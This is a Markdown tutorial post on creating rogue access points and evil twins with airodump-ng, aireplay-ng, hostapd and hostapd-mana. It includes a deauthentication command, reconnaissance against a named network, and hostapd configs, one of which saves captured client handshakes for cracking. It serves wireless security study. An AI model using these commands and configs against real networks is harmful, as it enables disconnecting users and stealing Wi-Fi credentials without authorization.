---
description: >-
  Rogue Access Points
title:  Rogue Access Points      # Add title here
date: 2023-09-27 08:00:00 -0600                           # Change the date to match completion date
categories: [18 Wireless, Wireless Attacks]                     # Change Templates to Writeup
tags: [wireless, rogue AP, evil-twin]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

A rogue AP is an AP in use that has not been authorized by a local network administrator. This could take the form of an AP plugged into a network without the administrator's knowledge.

### Creating a Rogue AP
Evil twins can be in any channel, except if we clone the BSSID of the AP we want to impersonate, in which case the channel must be different. But APs with different BSSID and equal ESSID can coexist in the same channel.

If we get a connection in an evil twin, the connected client won't have internet access if we don't give him an IP with a dhcp server.

> With hostapd, we need to be listening with airodump (on another wifi interface) at the same time that we host the fake ap, to capture handshakes of clients that try to connect to us, despite the PSK mismatch (since we don't know the real PSK but will crack it from their handshake to us)
{: .prompt-warning }

Deauth a client if he doesn't connect to our AP
``sudo aireplay-ng --deauth 4 -a <bssid> -c <client_MAC> wlan0mon``

### Gathering Information
While some clients will connect to our rogue AP just based on the SSID being the same as the target, our attack is more likely to succeed if we match the encryption details as well. To accomplish this, we need to conduct reconnaissance against the target to gather information.
```bash
airodump-ng -w discovery --output-format pcap wlan0
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 10:A7:93:BE:F0:B0  -47        2        0    0  11  195   WPA2 CCMP   PSK  SHUC-IRAN

  BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                              
 (not associated)   8C:68:3A:9C:45:D8  -59    0 - 1      0        1          ShuciNetwork        
```
We will target the AP with the SSID "SHUC-IRAN". The airodump-ng output shows us SHUC-IRAN with the following details:

| Feature | Value |
|---------|-------|
| Encryption | WPA2-PSK + CCMP |
| Throughput | 195 Mbit |
| Channel | 11 |

When we create our rogue AP, we should match these settings as closely as possible to ensure that clients automatically connect to our rogue AP based on their Preferred Network List.

We shouldn't solely trust the output of airodump-ng since it only shows the highest encryption possible. If the `SHUC-IRAN` target network also supports WPA1, that information will not be displayed in the table.

To check for further information we need to analyze the previously generated traffic `discovery-01.pcap` with wireshark:
```bash
# Wireshark reading pcap
wireshark -r discovery-01.pcap
# Filter
wlan.fc.subtype == 0x08 && wlan.ssid == "SHUC-IRAN"
```

Additionally if we look closely, we can see that there is a client trying to connect to an SSID called `ShuciNetwork` we could also create our rogue AP based on the client probes which we can retrieve from PCAP file using `wlan.fc.subtype == 0x08 && wlan.bssid contains 10:A7:93:BE:F0:B0`


### hostapd / hostapd-mana
hostapd-mana is an enhanced version of hostapd. Both are used for hosting fake APs, but mana includes more options to do things like dump passwords obtained from the handshake. Hostapd-mana can read hostapd config files, but also includes other options 

Install
```bash
sudo apt install hostapd-mana
sudo apt install hostapd-mana
```

Run
```bash
hostapd a.conf
hostapd-mana a.conf
```

Parameters: 
- ``driver=nl80211``  -> always the same for all linux devices
- ``hw_mode=g`` -> 2.4 GHz  y 54 Mb
- auth_algs (this is for WEP, for WPA use the equivalent ``wpa`` parameter-> 
	- ``auth_algs=0`` ->OPEN
	- ``auth_algs=1`` ->WEP
	- ``auth_algs=2`` -> Both
- ``wep_key0`` <- we can use up to 4
- Type of security
	- ``wpa=3`` -> activate both WPA and WPA2
	- ``wpa=2`` -> activate only WPA2
	- ``wpa=1`` -> activate only WPA

Type of authentication:
- ``wpa_key_mgmt=WPA-PSK``
- ``wpa_passphrase=<passphrase>`` -> passphrase in the case of PSK auth, we can set anything here, we don't care it's wrong

Encryption type (if the target is exclusiveliy WPA1 or WPA2 use just one of the following):
- ``wpa_pairwise=TKIP CCMP`` -> TKIP or CCMP encryption with WAP1
- ``rsn_pairwise=TKIP CCMP`` -> TKIP or CCMP encryption with WPA2

- ``mana_wpaout``-> where to save the captured handshakes (in a Hashcat hccapx format). 

#### hostap with  no encryption
```
interface=wlan1
ssid=hostel-A
hw_mode=g
channel=6
driver=nl80211
```

#### hostap with wep
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211
ssid=hostel-A
auth_algs=1
wep_default_key=0
wep_key0="54321"
```

#### hostap with WPA-PSK
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211
ssid=HomeAlone
auth_algs=1
wpa=1
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
wpa_passphrase=welcome@123
```

#### hostap with WPA2-PSK
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211
ssid=Lost-in-space
auth_algs=1
wpa=1
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=beautifulsoup

# SSID 2
bss=wlan1_0
ssid=LOCOMO-Mobile-hotspot
auth_algs=1
wpa=1
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=beautifulsoup
```

alternative
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211

ssid=Lost-in-space
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=beautifulsoup
```

#### Hosting several APs
Two different ESSIDs with the same wifi antenna (interface wlan1). With hostap, if we want to simulate several ESSIDs, the first one must use the keyword "interface" and the real interface name, and the next ones use the keyword "bss" and we use fictitious names, like wlan1_0. This can be used if a client probes different clients.
```
# SSID 1
interface=wlan1
driver=nl80211
ssid=dex-net
wpa=2
wpa_passphrase=123456789
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
channel=1

# SSID 2
bss=wlan1_0
ssid=dex-network
wpa=2
wpa_passphrase=123456789
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
channel=1
```


```
interface=wlan0
ssid=<ESSID>
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/output.hccapx
```